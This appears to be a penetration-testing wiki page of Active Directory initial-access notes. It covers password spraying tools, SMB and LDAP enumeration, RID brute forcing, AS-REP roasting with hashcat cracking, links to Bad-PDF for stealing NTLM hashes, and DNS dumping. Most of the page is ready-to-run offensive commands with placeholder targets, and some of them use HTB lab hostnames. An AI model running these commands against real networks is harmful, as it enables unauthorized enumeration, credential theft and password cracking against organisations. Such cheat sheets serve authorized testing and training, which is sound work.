---
layout: wiki
title: Initial Access
cate1: Internals
cate2: 1
description: Initial Access
keywords: Internals
---

# Initial Access

## OSINT
Generate Active Domain username conventions
  - [generate-ad-username](https://github.com/w0Tx/generate-ad-username)

## Password Spraying
**[Password Spraying via Sprayhound](https://github.com/Hackndo/sprayhound)**
  - Checks badpwdcount attribute only in the domain policy

**Additional Resources**
  - [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)
  - [Invoke-CleverSpray](https://github.com/wavestone-cdt/Invoke-CleverSpray)
  - [Spray](https://github.com/Greenwolf/Spray)
  - [Hashcat Wordlists - InternalAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/hash-cracking/#hashcat-install)

## SMB Enumeration
**Nmap**

```
nmap --script smb-vuln* -p 139,445 [ip]
```

**Netexec**
```
## List Shares - Null session
netexec smb [host/ip] -u [user] -p [pass] --shares

## List Shares - Guest session
netexec smb [host/ip] -u guest -p '' --shares

## Spider Module through files
netexec smb -u [user] -p [pass] -M spider_plus
```

**Enum4linux**

```
enum4linux -a -u "" -p "" <DC IP>
enum4linux -a -u "guest" -p "" <DC IP>
```

**Smbclient**
```
smbclient -N -L //[ip]
smbclient //[ip]/[share name] -U [username] [password]
```

**Additional Resources**
  - [SMB - Share Enumeration Cheat Sheet](https://0xdf.gitlab.io/2024/03/21/smb-cheat-sheet.html)
  - [BIWasp/NetExec cheat sheet](https://github.com/BlWasp/NetExec-Cheatsheet)
  - [SMB Enumeration cheat sheet](https://0xdf.gitlab.io/2024/03/21/smb-cheat-sheet.html)
  - [CrackMapExec + NetExec cheat sheet](https://github.com/seriotonctf/cme-nxc-cheat-sheet)

## Rid Brute via SMB
**[Rid Brute via SMB](https://medium.com/@e.escalante.jr/active-directory-workshop-brute-forcing-the-domain-server-using-crackmapexec-pt-6-feab1c43d970)**

*Credits to 0xdf located [here](https://0xdf.gitlab.io/2024/03/21/smb-cheat-sheet.html)*

Every Windows object (including users and groups) has a security identifier or SID. The SID is a unique ID that contains a bunch of information about the domain configuration, and might look something like `S-1-5-21-1004336348-1177238915-682003330-512`.

Within a domain or stand-alone host, the entire SID except the last number will be the same, and the last number is the relative identifier, or RID. These values fall in a predictable range, and thus, we can brute force the numbers across that range and get a list of users and groups.

**Requires:** Guest read access to IPC$ (Remote IPC) SMB File Share 
```
## Using Netexec
nxc smb [IP] -u 'guest' -p '' --rid-brute > sid.txt
cat sid.txt | awk -F': ' '{print $2}' | awk '{print $1}' | sed 's/[DOMAIN]\\//' > users.txt

## Using rpcclient
rpcclient [IP] -U 'guest%'
lookupnames administrator
lookupsids S-1-5-21-622327497-3269355298-2248959698-[RID_value]

## Using Impacket
lookupsid.py guest@[IP] -no-pass

## ASrep Hashes via Username Enumeration
GetNPUsers.py [DOMAIN]/ -usersfile users.txt -format hashcat
hashcat -m 18200 creds.txt /usr/share/wordlists/rockyou.txt
```

## LDAP Enumeration
**Nmap**

```
nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>
```

**LDAPSearch**

```
ldapsearch -x -H ldap://BLACKFIELD -s base namingcontexts (Domain Contexts)
ldapsearch -x -H ldap://BLACKFIELD -D 'CN=support,CN=users,DC=BLACKFIELD,DC=local' -W -b 'DC=BLACKFIELD,DC=local' '(objectClass=user)' (Search Users)
ldapsearch -H ldap://192.168.110.55 -x -D "web_svc@painters.htb" -W -b "dc=painters,dc=htb" "(msDS-AllowedToDelegateTo=*)" msDS-AllowedToDelegateTo (Constrained Delegation)
```

**Additional resources**
  - [LDAPSearch Enumeration](https://notes.benheater.com/books/active-directory/page/ldapsearch)
  - [Useful LDAP queries](https://podalirius.net/en/articles/useful-ldap-queries-for-windows-active-directory-pentesting/)
  - [LDAP Domain Dump via Linux](https://github.com/dirkjanm/ldapdomaindump)

## Poisoning and Relay
Refer to [Poisoning and Relay](https://qwutony.github.io/wiki/003-3-Poisoning-And-Relay/)

## Web Application Vulnerabilities
**Bad PDF**
Bad-PDF create malicious PDF file to steal NTLM(NTLMv1/NTLMv2) Hashes from windows machines, it utilize vulnerability disclosed by checkpoint team to create the malicious PDF file. Bad-Pdf reads the NTLM hashes using Responder listener.

**Additional Resources**
  - [Malicious PDF](https://github.com/jonaslejon/malicious-pdf)
  - [Bad PDF](https://github.com/deepzec/Bad-Pdf)
  - [Bad PDF Checkpoint Research](https://research.checkpoint.com/ntlm-credentials-theft-via-pdf-files/)

## Integrated DNS Dump
**[Integrated DNS Dump](https://github.com/dirkjanm/adidnsdump)**

Any user in Active Directory can enumerate all DNS records in the Domain or Forest DNS zones, similar to a zone transfer.

Additional Resources:
  - [ADIDNS Dump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
